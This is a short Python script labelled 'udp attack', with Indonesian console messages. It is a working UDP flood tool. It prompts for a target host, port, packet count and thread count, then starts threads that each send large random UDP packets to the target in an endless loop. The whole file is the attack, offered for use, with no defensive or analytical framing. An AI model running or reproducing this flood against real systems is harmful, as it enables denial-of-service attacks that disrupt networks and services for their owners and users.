#REMAKE BY AWANG
#udp attack
import random
import socket
import threading
import time

print("PASTIKAN JARINGAN KALIAN LANCAR")
print("INI MENGUNNAKAN CPU YG BANYAK ")
ip = str(input(" Host/Ip:"))
port = int(input(" Port:"))
choice = str(input(" UDP:"))
times = int(input(" Packets per one connection:"))
threads = int(input(" Threads:"))
def run():
	data = random._urandom(9024)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" Sent!!!")
		except:
			print(i +"ERROR TO CONNECT")

for y in range(threads):
	if choice == 'UDP':
		th = threading.Thread(target = run)
		th.start()